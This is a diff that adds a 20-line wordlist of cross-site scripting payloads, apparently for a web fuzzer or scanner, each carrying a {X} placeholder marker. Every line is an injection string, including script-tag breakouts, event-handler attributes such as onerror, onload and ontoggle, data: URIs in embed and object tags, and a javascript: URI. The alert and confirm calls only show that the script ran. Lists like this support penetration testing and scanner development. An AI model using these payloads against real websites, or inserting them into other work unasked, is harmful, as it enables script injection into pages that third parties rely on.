@@ -1,0 +1,20 @@
+"><script>alert('{X}')</script>
+" autofocus onfocus=alert('{X}')
+'><img src=x onerror=alert('{X}')>
+<svg/onload=alert('{X}')>
+"><svg/onload=prompt`{X}`>
+</script><script>alert('{X}')</script>
+<iframe srcdoc="<script>alert('{X}')</script>">
+<details open ontoggle=alert('{X}')>
+<marquee onstart=alert('{X}')>
+<body onload=confirm('{X}')>
+<svg><animate onbegin=alert('{X}') attributeName=x dur=1s></svg>
+<video src onerror="alert('{X}')"></video>
+<math><mtext></mtext><mstyle onload=alert('{X}')></math>
+<embed src="data:text/html,<script>alert('{X}')</script>">
+<object data="data:text/html,<script>alert('{X}')</script>">
+<svg><script>alert('{X}')</script></svg>
+javascript:alert('{X}')
+"><img src=x onerror=confirm('{X}')>
+"><body onload=alert('{X}')>
+'"><svg/onload=alert`{X}`>
